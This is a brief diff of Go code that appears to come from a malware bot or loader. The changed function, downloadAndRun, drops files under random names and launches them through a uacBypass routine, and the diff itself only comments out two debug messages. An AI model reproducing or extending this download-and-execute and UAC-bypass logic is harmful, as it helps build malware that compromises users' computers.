@@ -48,7 +48,7 @@ func downloadAndRun(mod string, file string, MD5 string, uac string, Parameters 
 					uacBypass(tmpPath + n + ".exe" + " " + Parameters)
 				}
 			} else {
-				newDebugUpdate("Download and Run File Currupted")
+				// newDebugUpdate("Download and Run File Currupted")
 			}
 		} else {
 			n := randomString(5, false)
@@ -89,7 +89,7 @@ func downloadAndRun(mod string, file string, MD5 string, uac string, Parameters 
 						uacBypass(tmpPath + n + ".exe")
 					}
 				} else {
-					newDebugUpdate("Download and Run File Currupted")
+					// newDebugUpdate("Download and Run File Currupted")
 				}
 			} else {
 				n := randomString(5, false)
